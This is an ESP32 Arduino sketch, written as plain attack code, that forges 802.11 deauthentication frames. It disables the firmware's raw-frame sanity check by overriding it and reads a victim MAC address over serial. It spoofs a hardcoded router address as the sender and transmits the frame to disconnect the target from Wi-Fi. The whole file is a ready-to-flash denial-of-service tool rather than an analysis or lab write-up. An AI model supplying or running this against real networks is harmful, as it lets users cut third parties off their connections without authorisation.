#include <WiFi.h>
#include <esp_wifi.h>

// Function to bypass the sanity check for raw frame transmission
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

// Function to send a packet to the Serial port in hexadecimal format
void dumpPacketToSerial(const uint8_t *packet, size_t length)
{
    for (size_t i = 0; i < length; i++)
    {
        if (packet[i] < 16)
        {
            Serial.print("0");
        }
        Serial.print(packet[i], HEX);
        Serial.print(" ");
    }
    Serial.println();
}

// Function to deauthenticate a device from the network
void deauthenticateDevice(const uint8_t *macAddress, int reasonCode)
{
    wifi_promiscuous_filter_t filter;
    filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_MGMT; // Only capture management frames

    // Set the filter
    esp_wifi_set_promiscuous_filter(&filter);

    // Prepare the deauthentication packet
    uint8_t deauthPacket[26];
    memset(deauthPacket, 0, sizeof(deauthPacket));

    // Frame Control
    deauthPacket[0] = 0xC0; // Type: Management, Subtype: Deauthentication, To DS: 0, From DS: 0

    // Duration
    deauthPacket[2] = 0x00;
    deauthPacket[3] = 0x00;

    // Destination MAC
    for (int i = 0; i < 6; i++)
    {
        deauthPacket[4 + i] = macAddress[i];
    }

    // Source MAC
    uint8_t routerMac[6] = {0x74, 0x4D, 0x28, 0x36, 0x01, 0x60};

    for (int i = 0; i < 6; i++)
    {
        deauthPacket[10 + i] = routerMac[i];
    }

    // BSSID
    for (int i = 0; i < 6; i++)
    {
        deauthPacket[16 + i] = routerMac[i];
    }

    // Reason Code
    deauthPacket[24] = reasonCode & 0xFF;
    deauthPacket[25] = 0x00;

    // Send the deauthentication packet
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
    Serial.println("esp_wifi_80211_tx result: " + String(result));

    // Dump the entire deauthentication packet to Serial for debugging
    Serial.println("Sent Deauthentication Packet:");
    dumpPacketToSerial(deauthPacket, sizeof(deauthPacket));

    // Restore the filter
    esp_wifi_set_promiscuous_filter(NULL);
}

void setup()
{
    // Initialize Serial
    Serial.begin(115200);

    // Initialize Wi-Fi
    WiFi.mode(WIFI_STA);
    WiFi.begin("*****", "*****"); // TODO: Am scos credentialele!!!

    while (WiFi.status() != WL_CONNECTED)
    {
        delay(1000);
        Serial.println("Connecting to WiFi...");
    }
    Serial.println("Connected to WiFi");
}

void loop()
{
    // Read the target MAC address from Serial input
    if (Serial.available() >= 17)
    { // MAC address format: "AA:BB:CC:DD:EE:FF"
        char targetMacStr[18];
        Serial.readBytes(targetMacStr, 17);
        targetMacStr[17] = '\0';

        // Parse the target MAC address
        uint8_t targetMac[6];
        sscanf(targetMacStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &targetMac[0], &targetMac[1], &targetMac[2],
               &targetMac[3], &targetMac[4], &targetMac[5]);

        // Call deauthenticateDevice with the parsed MAC address and reason code
        deauthenticateDevice(targetMac, 0x01); // 0x01 is a reason code for "Unspecified reason"
    }
}
